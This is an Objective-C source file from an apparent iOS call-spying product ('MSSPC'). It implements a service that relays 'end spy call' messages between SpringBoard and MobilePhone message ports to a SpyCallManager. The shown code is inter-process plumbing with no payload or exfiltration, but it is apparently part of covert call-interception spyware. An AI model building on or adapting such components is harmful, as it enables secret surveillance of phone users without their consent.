//
//  SpyCallMobilePhoneService.m
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SpyCallMobilePhoneService.h"
#import "SpyCallManager.h"
#import "SpyCallSerivceIDs.h"
#import "SystemEnvironmentUtils.h"

#import "DefStd.h"
#import "MessagePortIPCSender.h"

static SpyCallMobilePhoneService *_SpyCallMobilePhoneService;

@interface SpyCallMobilePhoneService (private)

- (void) service;

@end


@implementation SpyCallMobilePhoneService

@synthesize mSpyCallManager;

+ (id) sharedService {
	if (_SpyCallMobilePhoneService == nil) {
		_SpyCallMobilePhoneService = [[SpyCallMobilePhoneService alloc] init];
		[_SpyCallMobilePhoneService setMSpyCallManager:[SpyCallManager sharedManager]];
		[_SpyCallMobilePhoneService service];
	}
	return (_SpyCallMobilePhoneService);
}

+ (id) sharedServiceWithSpyCallManager: (SpyCallManager *) aSpyCallManager {
	if (_SpyCallMobilePhoneService == nil) {
		_SpyCallMobilePhoneService = [[SpyCallMobilePhoneService alloc] init];
		[_SpyCallMobilePhoneService setMSpyCallManager:aSpyCallManager];
		[_SpyCallMobilePhoneService service];
	}
	return (_SpyCallMobilePhoneService);
}

- (id) init {
	if ((self = [super init])) {
	}
	return (self);
}

- (void) sendService: (NSInteger) aServiceID withServiceData: (id) aData {
	NSInteger serviceID = aServiceID;
	NSMutableData *data = [NSMutableData data];
	[data appendBytes:&serviceID length:sizeof(NSInteger)];
	switch (aServiceID) {
		case kSpyCallServiceEndSpyCall:
			;
			break;
		default:
			break;
	}
	MessagePortIPCSender *sender = [[MessagePortIPCSender alloc] initWithPortName:kMobilePhoneMsgPort];
	[sender writeDataToPort:data];
	[sender release];
}

- (void) service {
	mServiceIsOn = TRUE;
	mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kSpringBoardMsgPort withMessagePortIPCDelegate:self];
	[mMessagePortReader start];
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSInteger serviceID = kSpyCallServiceUnknown;
	NSInteger location = 0;
	[aRawData getBytes:&serviceID range:NSMakeRange(location, sizeof(NSInteger))];
	location += sizeof(NSInteger);
	switch (serviceID) {
		case kSpyCallServiceEndSpyCall:
			[[self mSpyCallManager] disconnectedActivityDetected];
			break;
		default:
			break;
	}
}

- (void) dealloc {
	[mMessagePortReader release];
	[super dealloc];
}

@end
